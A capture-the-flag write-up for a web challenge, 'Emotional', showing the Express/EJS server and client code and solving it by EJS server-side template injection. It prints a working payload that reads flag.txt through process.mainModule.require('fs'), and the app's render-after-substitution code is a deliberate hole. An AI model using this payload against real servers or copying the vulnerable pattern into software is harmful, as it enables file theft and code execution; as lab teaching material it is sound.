# Emotional

> Web

```text
Don't be shy, show your emotions! Get emotional if you have to! Uncover the flag.
```

![image](./images/emo1.png)

## Files Provided

```text
emotional
├── Dockerfile
├── flag.txt
├── package.json
├── public
│   └── scripts
│       └── client.js
├── server.js
└── views
    └── index.ejs
```

`server.js`:

```js
const fs = require('fs');
const ejs = require('ejs');
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let profile = {
    emoji: "😊"
};

app.post('/setEmoji', (req, res) => {
    const { emoji } = req.body;
    profile.emoji = emoji;
    res.json({ profileEmoji: emoji });
});

app.get('/', (req, res) => {
    fs.readFile(path.join(__dirname, 'views', 'index.ejs'), 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send('Failed to read server file. Please notify a CTF admin.');
        }
        
        try {
            const profilePage = data.replace(/<% profileEmoji %>/g, profile.emoji);
            const renderedHtml = ejs.render(profilePage, { profileEmoji: profile.emoji });
            res.send(renderedHtml);
        } catch (renderErr) {
            res.send("An error occurred: " + renderErr)
        }
    });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
```

`client.js`:

```js
$("#submitEmoji").click(function() {
    const emoji = selectedEmoji;
    $.post('/setEmoji', { emoji: emoji }, function(response) {
        $('#currentEmoji').text(response.profileEmoji);
        $('#selectedEmoji').text(response.profileEmoji);
        document.querySelectorAll('.emoji-btn').forEach(btn => {
            btn.classList.remove('selected-emoji');
            if (btn.textContent === response.profileEmoji) {
                btn.classList.add('selected-emoji');
            }
        });
        showNotification('Emoji updated successfully!', 'success');
    }).fail(function() {
        showNotification('Failed to update emoji. Please try again.', 'error');
    });
});

function showNotification(message, type) {
    const notification = $(`
        <div class="alert alert-${type === 'success' ? 'success' : 'danger'} alert-dismissible fade show position-fixed" 
             style="top: 20px; right: 20px; z-index: 9999; min-width: 300px;">
            ${message}
            <button type="button" class="close" data-dismiss="alert">
                <span>&times;</span>
            </button>
        </div>
    `);
    
    $('body').append(notification);
    
    setTimeout(() => {
        notification.alert('close');
    }, 3000);
}
```

`index.ejs`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <title>Get Emotional</title>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .container {
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 1rem;
        }
        
        .emoji-display {
            font-size: 12rem;
            text-align: center;
            margin: 2rem 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }
        
        .main-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 2rem;
            margin: 1rem auto;
            min-width: 500px;
            max-width: 600px;
            max-height: 80vh;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            display: flex;
            flex-direction: column;
        }
        
        .profile-section {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .emoji-section {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        .emoji-grid {
            display: grid;
            grid-template-columns: repeat(8, 1fr);
            gap: 8px;
            margin: 0;
            max-height: 250px;
            overflow-y: auto;
            padding: 0.5rem;
            flex: 1;
        }
        
        .emoji-grid::-webkit-scrollbar {
            width: 8px;
        }
        
        .emoji-grid::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 4px;
        }
        
        .emoji-grid::-webkit-scrollbar-thumb {
            background: #667eea;
            border-radius: 4px;
        }
        
        .emoji-grid::-webkit-scrollbar-thumb:hover {
            background: #5a6fd8;
        }
        
        .emoji-btn {
            font-size: 2rem;
            background: none;
            border: 2px solid transparent;
            border-radius: 10px;
            padding: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .emoji-btn:hover {
            border-color: #667eea;
            background: rgba(102, 126, 234, 0.1);
            transform: scale(1.1);
        }
        
        .selected-emoji {
            border-color: #667eea !important;
            background: rgba(102, 126, 234, 0.2) !important;
            transform: scale(1.1);
        }
        
        
        .current-emoji {
            font-size: 8rem;
            margin: 1rem 0;
        }
        
        .submit-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            color: white;
            padding: 12px 30px;
            border-radius: 25px;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>

<div class="container">
    <div class="main-card">
        <div class="profile-section">
            <h2><b>Get Emotional!</b></h2>
            <div class="current-emoji">
                <span id="currentEmoji"><% profileEmoji %></span>
            </div>
            <button id="submitEmoji" class="btn submit-btn mt-3">Update Emotion</button>
        </div>
        
        <div class="emoji-section">
            <div class="emoji-grid" id="emojiGrid">
            </div>
        </div>
    </div>
</div>

<script src="/scripts/client.js"></script>
<script>
    const emojis = [
        '😊', '😄', '😃', '😁', '😆', '😅', '😂', '🤣',
        '😇', '🙂', '🙃', '😉', '😌', '😍', '🥰', '😘',
        '😗', '😙', '😚', '😋', '😛', '😝', '😜', '🤪',
        '🤨', '🧐', '🤓', '😎', '🤩', '🥳', '😏', '😒',
        '😞', '😔', '😟', '😕', '🙁', '☹️', '😣', '😖',
        '😫', '😩', '🥺', '😢', '😭', '😤', '😠', '😡',
        '🤬', '🤯', '😳', '🥵', '🥶', '😱', '😨', '😰',
        '😥', '😓', '🤗', '🤔', '🤭', '🤫', '🤥', '😶',
        '😐', '😑', '😬', '🙄', '😯', '😦', '😧', '😮',
        '😲', '🥱', '😴', '🤤', '😪', '😵', '🤐', '🥴',
        '🤢', '🤮', '🤧', '😷', '🤒', '🤕', '🤑', '🤠',
        '😈', '👿', '👹', '👺', '🤡', '💩', '👻', '💀',
        '☠️', '👽', '👾', '🤖', '🎃', '😺', '😸', '😹',
        '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉',
        '🙊', '💋', '👋', '🤚', '🖐️', '✋', '🖖', '👌',
        '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉',
        '👆', '🖕', '👇', '☝️', '👍', '👎', '👊', '✊',
        '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏'
    ];
    
    let selectedEmoji = "<%- profileEmoji %>";
    
    const emojiGrid = document.getElementById('emojiGrid');
    emojis.forEach(emoji => {
        const btn = document.createElement('button');
        btn.className = 'emoji-btn';
        btn.textContent = emoji;
        btn.onclick = () => selectEmoji(emoji);
        emojiGrid.appendChild(btn);
    });
    
    function selectEmoji(emoji) {
        selectedEmoji = emoji;
        document.getElementById('currentEmoji').textContent = emoji;
        document.getElementById('selectedEmoji').textContent = emoji;
        
        document.querySelectorAll('.emoji-btn').forEach(btn => {
            btn.classList.remove('selected-emoji');
            if (btn.textContent === emoji) {
                btn.classList.add('selected-emoji');
            }
        });
    }
    
    selectEmoji(selectedEmoji);
</script>

</body>
</html>
```

## Solution

Selecting an emoji and clicking on "Update Emotion" sends the following POST request (copied the request as fetch):

```js
fetch("https://9203900c.proxy.coursestack.com/setEmoji", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest"
  },
  "referrer": "https://9203900c.proxy.coursestack.com/",
  "body": "emoji=%F0%9F%98%86",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

In `server.js`, we have:

```js
const profilePage = data.replace(/<% profileEmoji %>/g, profile.emoji);
const renderedHtml = ejs.render(profilePage, { profileEmoji: profile.emoji });
```

So, if profile.emoji contains EJS code, it will be executed when ejs.render() runs. This is **EJS SSTI**

Testing by modifying the fetch command, executing it in console and reloading:

```js
.
.
"body": "emoji=<%=2*2%>",
.
.
```

![image](./images/emo2.png)

Yep it worked! Now read the `flag.txt`:

```js
.
.
"body": "emoji=<%=global.process.mainModule.require('fs').readFileSync('flag.txt').toString()%>",
.
.
```

![image](./images/emo3.png)
